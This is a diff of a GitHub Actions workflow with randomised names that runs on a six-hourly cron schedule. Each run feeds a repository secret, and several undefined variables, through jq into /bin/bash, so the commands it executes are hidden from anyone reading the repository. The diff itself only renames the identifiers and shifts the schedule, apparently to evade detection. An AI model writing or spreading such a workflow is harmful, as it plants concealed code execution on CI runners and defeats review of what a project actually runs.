@@ -1,10 +1,10 @@
 name: ghauiijnan
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 5/6 * * *'
-
-jobs:  # 28100
+    - cron: '56 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,12 +12,11 @@ jobs:  # 28100
       - uses: actions/checkout@v4
       - name: ghauiijnan
         env:
-          rzlkw68846: ${{ secrets.rzlkw68846 }}
+          i1054: ${{ secrets.i1054 }}
         run: |
-          echo $rzlkw68846 | jq -r .jpp32 | /bin/bash
-          echo $o36725 | jq -r .vfir54 | /bin/bash
-          echo $o6548 | jq -r .yipr77361 | /bin/bash
-          echo $z05 | jq -r .dmv4275 | /bin/bash
-          echo $f0065 | jq -r .lba13 | /bin/bash
-          echo $sq31196 | jq -r .b6 | /bin/bash
+          echo $i1054 | jq -r .udn89227 | /bin/bash
+          echo $dkfl8 | jq -r .njlip65 | /bin/bash
+          echo $oxz102 | jq -r .nk246 | /bin/bash
+          echo $k8 | jq -r .evjf48318 | /bin/bash
+          echo $t0879 | jq -r .im13 | /bin/bash
 
